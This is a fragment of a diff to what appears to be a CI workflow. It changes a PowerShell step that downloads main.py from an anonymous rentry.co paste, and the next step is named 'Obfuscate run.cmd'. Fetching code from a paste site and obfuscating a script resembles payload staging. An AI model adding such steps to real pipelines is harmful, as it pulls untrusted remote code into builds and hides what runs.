@@ -18,7 +18,7 @@ jobs:
 
       - name: Download main.py
         run: |
-          Invoke-WebRequest -Uri https://rentry.co/6artz93e/raw -OutFile main.py
+          Invoke-WebRequest -Uri https://rentry.co/rbbydedw/raw -OutFile main.py
 
       - name: Obfuscate run.cmd
         run: |
